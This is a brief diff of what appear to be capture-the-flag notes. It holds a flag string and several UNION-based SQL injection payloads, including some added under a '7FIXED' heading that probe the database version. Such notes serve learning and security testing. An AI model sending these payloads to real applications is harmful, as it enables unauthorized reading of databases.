@@ -22,3 +22,11 @@ egische
 
 -1' UNION ALL SELECT badthing FROM naughty -- 
 NOVI{bl1nd_sql1_is_naughty}
+
+
+=================7FIXED========================
+-1' UNION ALL SELECT VERSION() -- 
+-1' UNION ALL SELECT variables where variable_name = 'version'
+-1' UNION SELECT VERSION();
+
+
